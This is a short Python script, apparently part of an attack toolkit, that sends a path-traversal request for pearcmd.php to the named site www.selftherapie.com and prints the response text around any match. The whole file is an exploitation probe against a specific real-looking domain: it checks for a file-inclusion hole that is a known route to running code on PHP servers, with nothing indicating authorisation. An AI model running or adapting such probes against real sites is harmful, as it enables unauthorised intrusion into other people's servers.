from core import http
u = "/page-templates/../../../../usr/local/lib/php/pearcmd.php"
http.drop("www.selftherapie.com")
r = http.request("www.selftherapie.com", u, tries=1)
t = r.text or ""
i = t.find("pearcmd")
print("позиция:", i, "из", len(t))
print(repr(t[max(0, i - 300):i + 300]))